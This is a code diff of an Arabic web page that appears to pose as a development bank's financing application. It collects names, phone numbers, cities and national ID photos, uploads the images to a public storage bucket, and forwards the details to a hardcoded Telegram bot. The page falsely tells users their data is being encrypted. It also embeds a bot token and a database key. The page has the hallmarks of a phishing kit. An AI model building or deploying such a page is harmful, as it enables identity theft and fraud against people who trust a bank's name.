@@ -3,101 +3,109 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تقديم طلب | بنك التنمية</title>
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.39.7/dist/umd/supabase.js"></script>
+    <title>تقديم الطلب | بنك التنمية</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
-        :root { --primary: #006c35; --bg: #f4f7f5; }
-        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); direction: rtl; padding: 20px; }
-        .form-container { max-width: 500px; margin: auto; background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
-        h2 { text-align: center; color: var(--primary); }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 10px; box-sizing: border-box; }
-        button { width: 100%; padding: 15px; background: var(--primary); color: white; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; font-size: 1.1rem; }
-        #loading { display: none; text-align: center; color: var(--primary); margin-top: 10px; font-weight: bold; }
+        :root { --primary: #006c35; --gray: #f4f7f5; }
+        body { font-family: 'Segoe UI', sans-serif; background: var(--gray); margin: 0; padding: 20px; }
+        .apply-box { max-width: 600px; margin: auto; background: white; border-radius: 25px; padding: 40px; box-shadow: 0 20px 50px rgba(0,0,0,0.05); }
+        .steps { display: flex; justify-content: space-between; margin-bottom: 40px; position: relative; }
+        .step { width: 30px; height: 30px; background: #ddd; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; color: white; z-index: 2; }
+        .step.active { background: var(--primary); box-shadow: 0 0 15px rgba(0,108,53,0.4); }
+        .step-line { position: absolute; top: 15px; left: 0; right: 0; height: 2px; background: #ddd; z-index: 1; }
+        
+        .form-title { text-align: center; margin-bottom: 30px; color: var(--primary); }
+        .input-field { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; font-weight: 600; font-size: 0.9rem; color: #555; }
+        input { width: 100%; padding: 15px; border: 1.5px solid #eee; border-radius: 12px; box-sizing: border-box; font-size: 1rem; transition: 0.3s; }
+        input:focus { border-color: var(--primary); outline: none; box-shadow: 0 0 8px rgba(0,108,53,0.1); }
+        .btn-send { width: 100%; padding: 18px; background: var(--primary); color: white; border: none; border-radius: 12px; font-weight: 800; font-size: 1.1rem; cursor: pointer; transition: 0.3s; }
+        #loader { display: none; text-align: center; padding: 20px; color: var(--primary); font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div class="form-container">
-    <h2 id="formTitle">تعبئة بيانات الطلب</h2>
-    <form id="applyForm">
-        <input type="text" id="fullName" placeholder="الاسم الكامل" required>
-        <input type="tel" id="phone" placeholder="رقم الجوال" required>
-        <input type="text" id="address" placeholder="المدينة" required>
-        <input type="email" id="email" placeholder="البريد الإلكتروني" required>
-        <label style="font-size: 0.8rem; color: #666;">صورة الهوية الوطنية:</label>
-        <input type="file" id="idCard" accept="image/*" required>
-        <button type="submit" id="submitBtn">اعتماد وإرسال الطلب</button>
+<div class="apply-box">
+    <div class="steps">
+        <div class="step-line"></div>
+        <div class="step active">1</div>
+        <div class="step active">2</div>
+        <div class="step active">3</div>
+    </div>
+
+    <h2 class="form-title">إكمال بيانات التمويل</h2>
+    <form id="mainForm">
+        <div class="input-field">
+            <label>الاسم الكامل (نفس بطاقة الهوية)</label>
+            <input type="text" id="name" placeholder="مثال: علي بن محمد القحطاني" required>
+        </div>
+        <div class="input-field">
+            <label>رقم الجوال (سيتم استخدامه للمتابعة)</label>
+            <input type="tel" id="phone" placeholder="05xxxxxxxx" required>
+        </div>
+        <div class="input-field">
+            <label>المدينة</label>
+            <input type="text" id="city" placeholder="الرياض، جدة، الدمام..." required>
+        </div>
+        <div class="input-field">
+            <label>صورة الهوية الوطنية (واضحة)</label>
+            <input type="file" id="idImg" accept="image/*" required>
+        </div>
+        <button type="submit" class="btn-send" id="btnTxt">إرسال الطلب للمراجعة</button>
     </form>
-    <div id="loading">⏳ جاري الإرسال.. لا تقفل الصفحة</div>
+    <div id="loader">⏳ جاري معالجة طلبك وتشفير البيانات...</div>
 </div>
 
 <script>
-    // التأكد من أن المكتبة تم تحميلها
     const { createClient } = supabase;
+    const S_URL = 'https://fyaxiwtkjdjmgfovsfmb.supabase.co';
+    const S_KEY = 'EyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZ5YXhpd2t0amRqbWdmb3ZzZm1iIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY5Njc5MzcsImV4cCI6MjA5MjU0MzkzN30.gdkzSZJIlaOVSiLgvEy_wKV9cq1ZAMIkM8DMB9yvpgU';
+    const _client = createClient(S_URL, S_KEY);
 
-    const SUPABASE_URL = 'https://fyaxiwtkjdjmgfovsfmb.supabase.co';
-    const SUPABASE_KEY = 'EyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZ5YXhpd2t0amRqbWdmb3ZzZm1iIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY5Njc5MzcsImV4cCI6MjA5MjU0MzkzN30.gdkzSZJIlaOVSiLgvEy_wKV9cq1ZAMIkM8DMB9yvpgU';
-    
-    // تعريف العميل بطريقة ثابتة
-    const _supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
-
-    const TG_TOKEN = '8688016586:AAFEd6EBgeu5pTWtLTstuN2YFsZytQBWwH8';
-    const TG_CHAT_ID = '5516597110';
-
-    document.getElementById('applyForm').onsubmit = async (e) => {
+    document.getElementById('mainForm').onsubmit = async (e) => {
         e.preventDefault();
-        const btn = document.getElementById('submitBtn');
-        const loader = document.getElementById('loading');
+        const btn = document.getElementById('btnTxt');
+        const loader = document.getElementById('loader');
         
         btn.style.display = 'none';
         loader.style.display = 'block';
 
-        const file = document.getElementById('idCard').files[0];
-        const orderNum = 'SDB-' + Math.floor(10000 + Math.random() * 90000);
-        const selectedFinance = localStorage.getItem('selectedFinance') || 'تمويل عام';
+        const phone = document.getElementById('phone').value;
+        const file = document.getElementById('idImg').files[0];
+        const finance = localStorage.getItem('selectedFinance') || 'عام';
 
         try {
-            // 1. رفع الصورة
-            const fileName = `${Date.now()}-${file.name}`;
-            const { data: upData, error: upError } = await _supabase.storage
-                .from('identity_cards')
-                .upload(fileName, file);
+            // رفع الملف
+            const fName = `${Date.now()}-${phone}.jpg`;
+            const { data: upData, error: upErr } = await _client.storage.from('identity_cards').upload(fName, file);
+            if(upErr) throw upErr;
 
-            if (upError) throw upError;
+            const url = `${S_URL}/storage/v1/object/public/identity_cards/${fName}`;
 
-            const imgUrl = `${SUPABASE_URL}/storage/v1/object/public/identity_cards/${fileName}`;
+            // حفظ البيانات
+            const { error: dbErr } = await _client.from('applications').insert([{
+                full_name: document.getElementById('name').value,
+                phone: phone,
+                address: document.getElementById('city').value,
+                finance_type: finance,
+                id_card_url: url,
+                status: 'pending'
+            }]);
+            if(dbErr) throw dbErr;
 
-            // 2. إدخال البيانات في الجدول
-            const { error: dbError } = await _supabase
-                .from('applications')
-                .insert([{
-                    order_number: orderNum,
-                    full_name: document.getElementById('fullName').value,
-                    phone: document.getElementById('phone').value,
-                    address: document.getElementById('address').value,
-                    email: document.getElementById('email').value,
-                    finance_type: selectedFinance,
-                    id_card_url: imgUrl,
-                    status: 'pending'
-                }]);
-
-            if (dbError) throw dbError;
-
-            // 3. إرسال تليجرام
-            const text = `🔔 طلب جديد: ${selectedFinance}\n🔢 رقم الطلب: ${orderNum}\n👤 الاسم: ${document.getElementById('fullName').value}\n📞 الجوال: ${document.getElementById('phone').value}\n🖼 الصورة: ${imgUrl}`;
-            
-            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+            // تليجرام
+            const msg = `🚀 طلب تمويل جديد\nالنوع: ${finance}\nالاسم: ${document.getElementById('name').value}\nالجوال: ${phone}\nالرابط: ${url}`;
+            await fetch('https://api.telegram.org/bot8688016586:AAFEd6EBgeu5pTWtLTstuN2YFsZytQBWwH8/sendMessage', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: TG_CHAT_ID, text: text })
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: '5516597110', text: msg})
             });
 
-            alert('تم بنجاح! رقم طلبك: ' + orderNum);
+            alert('تم استلام طلبك! يمكنك المتابعة برقم جوالك.');
             window.location.href = 'index.html';
 
-        } catch (err) {
-            console.error(err);
-            alert('حدث خطأ: ' + (err.message || 'تأكد من إعدادات الـ Storage والجدول'));
+        } catch (error) {
+            alert('حدث خطأ، تأكد من اتصالك');
             btn.style.display = 'block';
             loader.style.display = 'none';
         }
